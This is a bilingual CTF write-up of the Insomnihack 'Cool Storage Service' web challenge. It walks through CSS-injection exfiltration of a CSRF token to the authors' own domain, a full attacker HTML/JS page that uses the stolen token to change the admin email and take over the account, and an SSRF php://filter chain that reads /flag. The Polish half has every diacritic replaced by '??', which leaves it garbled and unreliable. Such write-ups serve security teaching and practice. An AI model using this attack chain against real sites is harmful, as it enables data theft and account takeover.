# Cool Storage Service (Web, 357p, 7 solved)

[PL](#pl-version)

In the task we get access to a simple PHP-based file storage service.
Initial setup seems like a classic XSS task, since we can provide admin with a link and he will visit it.
However it seems we can provide only a link to this storage service, and the CSP header is:

`Content-Security-Policy: default-src 'none'; style-src 'self'; img-src data: http:`

This means we can't execute any JS, styles can be loaded only from the same domain and pictures can be loaded from data or from external server.

We can use this service to store files, however `php, php3...` etc. extensions are blacklisted.
The service claims that we can upload only pictures, but in reality the checks are not very strict, so for example prefix `GIF` can fool it, same as prepending PNG header.

Once the file is uploaded we can view it, but it's loaded as `data` in base64 form.
We can trigger an error by trying to view non-existing file, and this will tell us that our sandbox is at `/uploads/sha256(our_login)`, but when we try to access the file directly via `http://css.teaser.insomnihack.ch/uploads/...` we get `Direct access to uploaded files is only allowed from localhost`.
This means that even if we could upload a `.php` file, we would probably not be able to execute it.

In some places on the page we get `echo` on our inputs.
For example searching for some filename, we get `Search results for : our text`.
In most places html entities are escaped, but there are a couple of places where it's not the case:

- In `view file` the filename is not escaped, so we can inject html there
- In `user profile` inputs are not escaped and we can inject html there as well
- In `login` screen there is a hidden input `redirect`, which is not escaped

![](inject.png)

To wrap up what we already have:

- CSP allows to load styles from the same domain
- We can echo any input we want on the page
- We can inject html tags
- CSP allows to load images from external server

This leads us to the first piece of the puzzle - we can inject html tag `<link rel="stylesheet" href="something"/>` tag in order to load css of our choosing.
The `something` has to be a link to the page which echos our payload, for example: 

`http:\\css.teaser.insomnihack.ch\index.php?search=%0a%7B%7D%20body%20%7B%20background-color%3A%20lightblue%3B%20%7D%0a&page=search&.css` 

which prints out `Search results for : {} body { background-color: lightblue; }`

Chaining the two in the form of: `http://css.teaser.insomnihack.ch/index.php?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22http%3A%5C%5Ccss.teaser.insomnihack.ch%5Cindex.php%3Fsearch%3D%250a%257B%257D%2520body%2520%257B%2520background-color%253A%2520lightblue%253B%2520%257D%250a%26page%3Dsearch%26.css`

Shows us a nice blue page, as expected.

We can now use CSS selectors to exflitrate data from the page! 
By creating style with entries in the form:

`input[value^="a" i]{background: url('http://url.we.own/a')`

We can listen for hits on the provided url, and this way we can check if the first letter of `value` attribute of `input` tags on the page is `a`.

There are some issues here:

- The only thing we can really `steal` is CSRF token.
- We can steal data only letter-by-letter. We need to steal first letter in order to prepare new CSS selectors for the second letter.
- It seems the token changes every time we send link to the admin, so we would need to extract the whole token in one go.
- Even if we get the CSRF token, we still can't run any JS, so we can't send any POST request as admin.

Initially we thought that only links to the page `http://css.teaser.insomnihack.ch` can be sent to admin, but it turned out that it was not the case.
In reality there was only a check for the `prefix` of URL, not a real domain check.
This means we could register `http://css.teaser.insomnihack.ch.our.cool.domain` and admin would visit this link just fine.

This solves the issue with sending a POST request, since we can now lure admin into our own page and send request from there.
It also solves the issue of stealing whole CSRF token, because we can now dynamically generate iframes with CSS selectors for consecutive letters.
We create iframe with selectors for first letter, grab the matching letter from our `backend` (listening for hits from CSS), and create another iframe with selectors for two letters using known prefix etc.
Once we have full token we can finally send a POST a admin.

- We were using domain `http://css.teaser.insomnihack.ch.nazywam.p4.team`.
- Endpoint `http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token` was simply blocking until a hit from CSS was done, and then it would return the matching letter.

```html
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var token = '';
function gen_src()
{
    src = 'http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22?page=search%26search=%25%250a{}%250a'
   
    chars = "0123456789abcdef"
    for(c = 0; c < 16; c++)
        src += 'input[value^=%27'+token+chars[c]+'%27%20i]{background:url(%27http:%252f%252fcss.teaser.insomnihack.ch.nazywam.p4.team%252fsave%252f'+chars[c]+'%27);}%250a'
    document.getElementById('ramek').src = src;
    console.log(src);
 
    $.ajax({
    type: "GET",
    url: "http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token",
    //async: false,
        success: function (data) {
            console.log(data);
            token += data;
            if(token.length < 32)
            {
                gen_src();
                }
            else
            {
                console.log(token);
                document.getElementById('csrf').value=token;
                document.getElementById('form').submit();
            }
        }
        });
}
</script>
</head>
<body onload="gen_src()">
<iframe id="ramek"></iframe>
<form action="http://css.teaser.insomnihack.ch/?page=profile" method="POST" id="form">
            <input type="text" name="name" value="p4"/>
            <input type="text" name="age" value="31337"/>
            <input type="text" name="country" value="p4"/>
            <input type="text" name="email" value="EMAIL_WE_CONTROL"/>
            <input type="hidden" name="csrf" value="" id="csrf"/>
            <input type="hidden" name="change" value="Modify profile"/>
        </tr>
    </form>
</body>
</html>
```

The best place to use the POST ability was the user profile page, because we can modify the user email there.
It's useful, because there was `forgot password` option in the application, and it would send password reset link to email in the profile.

This way we managed to reset admin password and login to the application as admin.
There is a single new option which is now available for us - fetch:

![](newoptions.png)

We can now provide URL and it seems the system downloads the designated image, so we have some kind of potential SSRF.
There is some protection against using localhost, 127.0.0.1 or internal relative path, but it can be bypassed using php wrappers or `localtest.me` domain, so we can "download" local files and also files in `uploads/`.

The intended way to solve the task was to upload `.pht` file with PHP shell and some `GIF` prefix to fool the parser into thinking it's a picture, and then execute this file using the `fetch` function.
Unfortunately we missed the `.pht` extension trick (although we tried almost all others), and our solution was a bit different.
We noticed that we could `fetch` the flag by using some php filter like `php://filter/read=convert.base64-encode/resource=/flag`, but we get `Not an image` error.

We already know that we could "fool" the parser by using prefix `GIF` at the beginning of the file.
We know that flag starts with `INS{`, what if we could chain a lot of encoders to turn this prefix into `GIF`?
We accidentally found even a simpler way - it turns out the parser would not complain if the payload has a nullbyte at the beginning, so instead of `GIF` prefix we wanted to get a nullbyte.
We run a simple brute-forcing loop which was randomly picking an encoder and attaching it to the chain and testing the output.
After a while we got: `php://filter/read=convert.base64-encode|convert.base64-encode|string.tolower|string.rot13|convert.base64-encode|string.tolower|string.toupper|convert.base64-decode/resource=/flag`

which for our example flag would give output accepted by the page as "image", and it turned out the website accepted this as well and gave us the base64 version of the result:

`ADFOMWL0AGTNYW1OATBTMW1PBXHVC3LNAMFHBWP0ZTZOZ3D0CWPLDWZ6A256D3KYANHXBNF6YWHVDW14ANFVEQ==`

Now the last part was to decode this back to a flag.
We can't simply invert it, because of the `tolower` and `toupper` conversions which are ambigious, but we figured we can try to brute-force it going forward from the known `INS{` prefix.
We can attach a new letter, encode this and check how much of this result matches the expected payload.
We can do this recursively:

```python
import string

s = "ADFOMWL0AGTNYW1OATBTMW1PBXHVC3LNAMFHBWP0ZTZOZ3D0CWPLDWZ6A256D3KYANHXBNF6YWHVDW14ANFVEQ==".decode("base64")


def enc(f):
    f = f.encode("base64")
    f = f.encode("base64")
    f = f.lower()
    f = f.encode("rot13")
    f = f.encode("base64")
    f = f.upper()
    f = f.decode("base64")
    return f


def brute(flg, score):
    print(flg, score)
    for c in string.letters + string.digits + "{}_":
        m = get_score(flg + c)
        if m > score:
            brute(flg + c, m)


def get_score(flg):
    f = enc(flg)
    m = -1
    for i in range(len(f)):
        if f[:i] == s[:i]:
            m = i
    return m


def main():
    flag = "INS{"
    score = get_score(flag)
    brute(flag, score)


main()
```

It doesn't work perfectly, but gives us best solutions as:

```
('INS{SoManyRebflawsCantbegoodfoq9ou}0', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}1', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}2', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}3', 63)

('INS{SoManyWebflawsCantbegoodfoq9ou}0', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}1', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}2', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}3', 63)
```

It might be that adding a certain letter doesn't immediately raise the score, so we don't follow this path, but from here we can already guess the flag to be `INS{SoManyWebflawsCantbegoodforyou}`.

### PL version

W zadaniu dostajemy dost??p do prostej aplikacji do przechowywania plik??w napisanej w PHP.
Pocz??tkowy setup wygl??da na klasyczne zadanie z zakresu XSS, poniewa?? mo??emy wys??a?? adminowi link kt??ry zostanie odwiedzony.
Niemniej wygl??da na to, ??e mo??emy poda?? jedynie link do tej??e aplikacji, a dodatkowo header CSP to:

`Content-Security-Policy: default-src 'none'; style-src 'self'; img-src data: http:`

Co oznacza, ??e nie mo??emy wykona?? ??adnego JSa, style mog?? by?? ??adowane tylko z tej samej domeny a obrazki ??adowane jako data albo z zewn??trznego serwera.

Mo??emy uploadowa?? w serwisie pliki, ale rozszerzenia `php, php3...` itd s?? blacklistowane.
Serwer informuje, ??e mo??na uploadowa?? tylko obrazki, ale w rzeczywisto??ci mo??na to do???? prosto obej???? dodaj??c prefix `GIF` do pliku lub do????czaj??c na pocz??tek nag????wek PNG.

Kiedy ju?? uploadujemy plik mo??emy go zobaczy??, ale jest ??adowany przez `data` w postaci base64.
Mo??emy wywo??a?? b????d, pr??buj??c otworzy?? nieistniej??cy plik i to m??wi nam ??e sandbox jest pod `/uploads/sha256(nasz_login)`, ale je??li spr??bujemy dosta?? si?? do plik??w bezpo??rednio przez url `http://css.teaser.insomnihack.ch/uploads/...` dostajemy informacje `Direct access to uploaded files is only allowed from localhost`.
To oznacza, ??e nawet gdyby??my mogli umie??ci?? tam plik `.php`, nie mieliby??my jak go wykona??.

W niekt??rych miejscach na stronie dostajemy `echo` z naszego inputu.
Na przyk??ad wyszukiwarka plik??w zwraca tekst `Search results for : to co wpisali??my`.
W wi??kszo??ci miejsc tagi html s?? escapowane, ale jest kilka miejsc gdzie nie ma to miejsca:

- W `view file` nazwa pliku pozwala na przemycenie html
- W `user profile` pola w formularzu tak??e pozwalaj?? na wstrzykni??cie html
- W `login` jest ukryte pole `redirect`, kt??re tak??e pozwala na umieszczenie html 

![](inject.png)

Podsumowuj??c, na t?? chwil?? mamy:

- CSP pozwala za??adowa?? style z tej samej domeny
- Mo??emy na stronie wy??wietli?? dowolny tekst
- Mo??emy wstrzykn???? tagi html
- CSP pozwala na ??adowanie obrazk??w z zewn??trznego serwera

To prowadzi nas do pierwszego fragmentu rozwi??zania - mo??emy wstrzykn???? tag `<link rel="stylesheet" href="CO??"/>` aby za??adowa?? styl css wybrany przez nas.
W tym przypadku `CO??` musi by?? linkiem do podstrony kt??ra wypisuje nasz styl, na przyk??ad:

`http:\\css.teaser.insomnihack.ch\index.php?search=%0a%7B%7D%20body%20%7B%20background-color%3A%20lightblue%3B%20%7D%0a&page=search&.css` 

Kt??re wypisuje: `Search results for : {} body { background-color: lightblue; }` 

????cz??c oba mamy: `http://css.teaser.insomnihack.ch/index.php?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22http%3A%5C%5Ccss.teaser.insomnihack.ch%5Cindex.php%3Fsearch%3D%250a%257B%257D%2520body%2520%257B%2520background-color%253A%2520lightblue%253B%2520%257D%250a%26page%3Dsearch%26.css`

Co daje nam niebieskie t??o ma stronie, czego oczekiwali??my.
Warto rozumie??, ze ??adujemy ca??y html strony jako styl, ale parser CSS pomija b????dne dyrektywy.

Mo??emy teraz u??y?? selektor??w CSS aby pobra?? dane ze strony.
Mo??emy utworzy?? w stylu wpisy:

`input[value^="a" i]{background: url('http://url.we.own/a')`

Teraz nas??uchuj??c na requesty HTTP do podanego urla mo??emy sprawdzi?? czy atrybut `value` p??l `input` na stronie zaczyna si?? od litery `a`.

Jest tu kilka problem??w:

- Jedyne co mo??emy ukra???? to token CSRF
- Mo??emy pobiera?? dane jedynie litera po literze. Potrzebujemy zna?? pierwsz?? liter?? ??eby przygotowa?? nowe selektory CSS do wyci??gni??cia drugiej litery itd.
- Wygl??da na to, ??e token zmienia za ka??dym razem kiedy wysy??amy link do admina, wi??c token trzeba pobra?? na raz.
- Nawet je??li dostaniemy token CSRF, to nadal nie mo??emy uruchomi?? ??adnego skryptu JS, wi??c nie mamy jak wys??a?? ????dania POST.

Pocz??tkowo my??leli??my ??e admin wchodzi tylko pod linki z domeny `http://css.teaser.insomnihack.ch`, ale w rzeczywisto??ci okaza??o si??, ??e to nie do ko??ca prawda i sprawdzany jest jedynie `prefix` adresu a nie domena.
Oznacza to, ??e mo??emy zarejestrowa?? sobie `http://css.teaser.insomnihack.ch.our.cool.domain` i admin wejdzie na nasz link.

To rozwi??zuje zagadk?? wysy??ania ????dania POST, poniewa?? mo??emy zwabi?? admina na nasz?? w??asn?? stron?? i wys??a?? request stamt??d.
Rozwi??zuje to te?? problem pobrania tokenu CSRF, bo mo??emy na naszej stronie dynamicznie generowa?? iframe z selektorami CSS dla kolejnych liter.
Tworzymy iframe dla pierwszej literki, pobieramy pasuj??c?? liter?? z `backendo` (kt??ry nas??uchuje na requesty z CSS), nast??pnie tworzymy nowy iframe z selektorami dla dw??ch liter ze znanym prefixem itd.
Po pobraniu ca??ego tokenu mo??emy wys??a?? POST jako admin.

- U??ywamy domeny `http://css.teaser.insomnihack.ch.nazywam.p4.team`.
- Adres `http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token` blokuje a?? nie dostaniemy requestu z CSS, wtedy zwraca pasuj??c?? liter??


```html
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var token = '';
function gen_src()
{
    src = 'http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22?page=search%26search=%25%250a{}%250a'
   
    chars = "0123456789abcdef"
    for(c = 0; c < 16; c++)
        src += 'input[value^=%27'+token+chars[c]+'%27%20i]{background:url(%27http:%252f%252fcss.teaser.insomnihack.ch.nazywam.p4.team%252fsave%252f'+chars[c]+'%27);}%250a'
    document.getElementById('ramek').src = src;
    console.log(src);
 
    $.ajax({
    type: "GET",
    url: "http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token",
    //async: false,
        success: function (data) {
            console.log(data);
            token += data;
            if(token.length < 32)
            {
                gen_src();
                }
            else
            {
                console.log(token);
                document.getElementById('csrf').value=token;
                document.getElementById('form').submit();
            }
        }
        });
}
</script>
</head>
<body onload="gen_src()">
<iframe id="ramek"></iframe>
<form action="http://css.teaser.insomnihack.ch/?page=profile" method="POST" id="form">
            <input type="text" name="name" value="p4"/>
            <input type="text" name="age" value="31337"/>
            <input type="text" name="country" value="p4"/>
            <input type="text" name="email" value="EMAIL_WE_CONTROL"/>
            <input type="hidden" name="csrf" value="" id="csrf"/>
            <input type="hidden" name="change" value="Modify profile"/>
        </tr>
    </form>
</body>
</html>
```

Najlepsze miejsce na wykorzystanie naszego POSTa to zmiana danych w profilu u??ytkownika, bo mo??emy zmieni?? tam email.
Jest to o tyle u??yteczne, ??e istnieje opcja `zapomnia??em has??a`, kt??ra wysy??a link z resetem has??a na email z profilu.

W ten spos??b udaje nam si?? zresetowa?? has??o admina i zalogowa?? do aplikacji na jego konto.
Pojawia si?? jedna nowa opcja - fetch:

![](newoptions.png)

Mo??emy poda?? URL i wygl??da na to, ??e system ??ci??ga obrazek z podanego adresu, wi??c mamy potencjalnie atak SSRF.
Jest zabezpieczenie przez podaniem adres??w localhost, 127.0.0.1 oraz wewn??trznych ??cie??ek wzgl??dnych, ale mo??emy obej???? to przez wrappery php albo `localtest.me`, wi??c mo??emy ??ci??ga?? tak??e lokalne pliki z `uploads/`.

Oczekiwane rozwi??zanie zak??ada??o, ??e uploadujemy plik `.pht` z kodem PHP i jaki?? prefixem `GIF` ??eby oszuka?? parser obrazk??w, a nast??pnie wykonamy ten plik za pomoc?? funkcji `fetch`.
Niestety przeoczyli??my rozszerzenie `.pht` (niemniej testowali??my chyba wszystkie inne mo??liwo??ci) i nasze rozwi??zanie jest nieco inne.
Zauwa??yli??my, ??e mo??emy wykona?? `fetch` na fladze przez jaki?? filtr np. `php://filter/read=convert.base64-encode/resource=/flag` ale dostajemy b????d `Not an image`.

Wiemy, ??e parser obrazk??w mo??na oszuka?? przez zwyk??e `GIF` na pocz??tku pliku.
Wiemy, ??e flaga zaczyna si?? od `INS{`, wi??c czy mo??e jeste??my w stanie tak posk??ada?? ze sob?? encodery, ??eby prefix flagi zamieni?? w `GIF`?
Przypadkiem w trakcie test??w trafili??my na jeszcze ??atwiejsze rozwi??zanie - okaza??o si??, ??e je??li parser napotka?? na pocz??tku na nullbyte to te?? przepuszcza?? taki plik, wi??c zamiast szuka?? `GIF` szukali??my nullbyte.
Pu??cili??my prostu brute-forcer, kt??ry testowa?? r????ne losowe z??o??enia encoder??w i testowa?? wynik z naszej przyk??adowej flagi.
Po jaki?? czasie dostali??my:
`php://filter/read=convert.base64-encode|convert.base64-encode|string.tolower|string.rot13|convert.base64-encode|string.tolower|string.toupper|convert.base64-decode/resource=/flag`

co dla naszej przyk??adowej flagi da??o wynik akceptowany przez stron?? jako "obrazek" i okaza??o si??, ??e to samo ma miejsce dla prawdziwej flagi, wi??c dostali??my base64 z wyniku kodowania:

`ADFOMWL0AGTNYW1OATBTMW1PBXHVC3LNAMFHBWP0ZTZOZ3D0CWPLDWZ6A256D3KYANHXBNF6YWHVDW14ANFVEQ==`

Ostatni krok to zdekodowanie tego zn??w do czytelnej flagi.
Nie mo??emy po prostu odwr??ci?? kodowania, bo mamy tam `tolower` oraz `toupper`, kt??re s?? niejednoznaczne, ale wpadli??my na pomys??, ??eby brute-forceowa?? to w prz??d, od znanego prefixu `INS{`.
Dodajemy nowy znak, kodujemy i por??wnujemy ile z prefixu pasuje do oczekiwanego wyniku.
Mo??emy to zrobi?? rekurencyjnie:

```python
import string

s = "ADFOMWL0AGTNYW1OATBTMW1PBXHVC3LNAMFHBWP0ZTZOZ3D0CWPLDWZ6A256D3KYANHXBNF6YWHVDW14ANFVEQ==".decode("base64")


def enc(f):
    f = f.encode("base64")
    f = f.encode("base64")
    f = f.lower()
    f = f.encode("rot13")
    f = f.encode("base64")
    f = f.upper()
    f = f.decode("base64")
    return f


def brute(flg, score):
    print(flg, score)
    for c in string.letters + string.digits + "{}_":
        m = get_score(flg + c)
        if m > score:
            brute(flg + c, m)


def get_score(flg):
    f = enc(flg)
    m = -1
    for i in range(len(f)):
        if f[:i] == s[:i]:
            m = i
    return m


def main():
    flag = "INS{"
    score = get_score(flag)
    brute(flag, score)


main()
```

Nie dzia??a to idealnie, ale dostajemy najlepsze rozwi??zania jako:

```
('INS{SoManyRebflawsCantbegoodfoq9ou}0', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}1', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}2', 63)
('INS{SoManyRebflawsCantbegoodfoq9ou}3', 63)

('INS{SoManyWebflawsCantbegoodfoq9ou}0', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}1', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}2', 63)
('INS{SoManyWebflawsCantbegoodfoq9ou}3', 63)
```

Czasem mo??e tak by??, ??e dodanie poprawnej literki nie daje nam przyrostu pasuj??cego prefixu, wi??c nie wchodzimy tam g????biej w rekurencje, ale st??d mo??emy ju?? r??cznie poprawi?? flag?? do: `INS{SoManyWebflawsCantbegoodforyou}`.
